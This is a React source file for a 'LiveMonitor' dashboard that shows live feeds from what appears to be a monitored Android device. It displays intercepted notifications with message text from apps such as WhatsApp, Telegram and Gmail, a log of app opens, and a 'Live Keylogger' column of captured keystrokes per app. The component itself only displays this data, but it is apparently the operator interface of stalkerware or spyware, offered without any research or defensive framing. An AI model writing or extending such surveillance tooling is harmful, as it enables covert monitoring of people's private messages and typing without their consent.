import React, { useRef, useEffect, useState } from 'react';

const APP_COLORS = {
  'com.whatsapp': '#25D366',
  'com.instagram.android': '#E1306C',
  'com.facebook.katana': '#1877F2',
  'org.telegram.messenger': '#0088cc',
  'com.snapchat.android': '#FFFC00',
  'com.zhiliaoapp.musically': '#010101',
  'com.twitter.android': '#1DA1F2',
  'com.facebook.orca': '#0099FF',
  'com.google.android.gm': '#EA4335',
};

function getAppColor(pkg) {
  if (!pkg) return '#7c3aed';
  return APP_COLORS[pkg] || '#' + Math.abs(pkg.split('').reduce((h, c) => (h << 5) - h + c.charCodeAt(0), 0) % 0xFFFFFF).toString(16).padStart(6, '7');
}

function appShort(pkg) {
  if (!pkg) return '?';
  const parts = pkg.split('.');
  return parts[parts.length - 1]?.slice(0, 2).toUpperCase() || '??';
}

function friendlyName(entry) {
  return entry?.appName || (entry?.packageName?.split('.').pop()) || 'Unknown';
}

function ColHeader({ icon, title, count, live }) {
  return (
    <div className="lm-col-header">
      <span className="lm-col-icon">{icon}</span>
      <span className="lm-col-title">{title}</span>
      {count !== undefined && <span className="lm-col-count">{count}</span>}
      {live && <span className="lm-live-dot">● LIVE</span>}
    </div>
  );
}

function NotifFeed({ entries }) {
  const endRef = useRef(null);
  useEffect(() => {
    endRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [entries.length]);

  if (!entries.length) {
    return (
      <div className="lm-empty">
        <div>🔔</div>
        <div>No notifications</div>
      </div>
    );
  }
  return (
    <div className="lm-feed">
      {entries.map((n, i) => {
        const color = getAppColor(n.packageName);
        return (
          <div key={`n-${i}-${n.postTime}`} className="lm-entry">
            <div className="lm-badge" style={{ background: color + '22', borderColor: color + '55', color }}>
              {appShort(n.packageName)}
            </div>
            <div className="lm-entry-body">
              <div className="lm-entry-row">
                <span className="lm-entry-app" style={{ color }}>{friendlyName(n)}</span>
                <span className="lm-entry-ts">{(n.timestamp || '').slice(11, 19)}</span>
              </div>
              {n.title && <div className="lm-entry-title">{n.title}</div>}
              {n.text && <div className="lm-entry-text">{n.text}</div>}
            </div>
          </div>
        );
      })}
      <div ref={endRef} />
    </div>
  );
}

function ActivityFeed({ entries }) {
  const endRef = useRef(null);
  useEffect(() => {
    endRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [entries.length]);

  if (!entries.length) {
    return (
      <div className="lm-empty">
        <div>📱</div>
        <div>No app opens yet</div>
      </div>
    );
  }
  return (
    <div className="lm-feed">
      {entries.map((a, i) => {
        const color = getAppColor(a.packageName);
        return (
          <div key={`a-${i}-${a.timestamp}`} className="lm-entry lm-entry-activity">
            <div className="lm-badge" style={{ background: color + '22', borderColor: color + '55', color }}>
              {appShort(a.packageName)}
            </div>
            <div className="lm-entry-body">
              <div className="lm-entry-row">
                <span className="lm-entry-app" style={{ color }}>{friendlyName(a)}</span>
                <span className="lm-entry-ts">{(a.timestamp || '').slice(11, 19)}</span>
              </div>
              <div className="lm-entry-text lm-pkg">{a.packageName}</div>
            </div>
          </div>
        );
      })}
      <div ref={endRef} />
    </div>
  );
}

function KeylogFeed({ entries }) {
  const endRef = useRef(null);
  useEffect(() => {
    endRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [entries.length]);

  if (!entries.length) {
    return (
      <div className="lm-empty">
        <div>⌨️</div>
        <div>No keystrokes yet</div>
      </div>
    );
  }
  return (
    <div className="lm-feed">
      {entries.map((k, i) => {
        const color = getAppColor(k.packageName);
        return (
          <div key={`k-${i}-${k.timestamp}`} className="lm-entry">
            <div className="lm-badge" style={{ background: color + '22', borderColor: color + '55', color }}>
              {appShort(k.packageName)}
            </div>
            <div className="lm-entry-body">
              <div className="lm-entry-row">
                <span className="lm-entry-app" style={{ color }}>{friendlyName(k)}</span>
                <span className="lm-entry-ts">{(k.timestamp || '').slice(11, 19)}</span>
              </div>
              <div className="lm-keylog-text">{k.text}</div>
            </div>
          </div>
        );
      })}
      <div ref={endRef} />
    </div>
  );
}

export default function LiveMonitor({ notifEntries, activityEntries, keylogEntries }) {
  const notifs   = (notifEntries    || []).slice(0, 100);
  const activity = (activityEntries || []).slice(0, 100);
  const keylogs  = (keylogEntries   || []).slice(0, 200);

  return (
    <div className="live-monitor">
      <div className="lm-col">
        <ColHeader icon="🔔" title="Notifications" count={notifs.length} live={notifs.length > 0} />
        <NotifFeed entries={notifs} />
      </div>
      <div className="lm-col">
        <ColHeader icon="📱" title="Recent Activity" count={activity.length} />
        <ActivityFeed entries={activity} />
      </div>
      <div className="lm-col">
        <ColHeader icon="⌨️" title="Live Keylogger" count={keylogs.length} live={keylogs.length > 0} />
        <KeylogFeed entries={keylogs} />
      </div>
    </div>
  );
}
